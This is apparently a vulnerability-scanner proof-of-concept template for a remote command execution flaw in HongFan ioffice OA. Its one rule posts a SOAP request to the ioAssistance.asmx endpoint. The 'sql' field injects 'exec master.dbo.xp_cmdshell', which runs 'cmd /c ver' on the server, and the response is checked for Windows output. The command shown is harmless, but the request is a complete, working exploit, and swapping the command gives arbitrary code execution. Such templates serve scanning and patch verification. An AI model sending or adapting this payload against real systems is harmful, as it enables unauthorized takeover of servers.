name: HongFan_ioffice_OA_RCE
transport: http
set: {}
detail:
  dock: app="ioffice"
  product: ioffice
  homepage: http://www.ioffice.cn/
  impact: ''
  description: HongFan ioffice OA has remote command execution vulnerabilities, causing
    attackers to gain server permissions.
rules:
  r1:
    method: POST
    path: /ioffice/prg/set/wss/ioAssistance.asmx
    follow_redirects: true
    headers:
      Content-Type: text/xml; charset=utf-8
      SOAPAction: '"http://tempuri.org/GetLoginedEmpNoReadedInf"'
    body: "<?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n<soap:Envelope xmlns:xsi=\"\
      http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"\
      \ xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\r\n  <soap:Body>\r\
      \n    <GetLoginedEmpNoReadedInf xmlns=\"http://tempuri.org/\">\r\n      <sql>exec\
      \ master.dbo.xp_cmdshell 'cmd /c ver'</sql>\r\n    </GetLoginedEmpNoReadedInf>\r\
      \n  </soap:Body>\r\n</soap:Envelope>"
    expression: response.status == 200 && response.body.bcontains(b'<output>') && response.body.bcontains(b'Windows')
expression: r1()
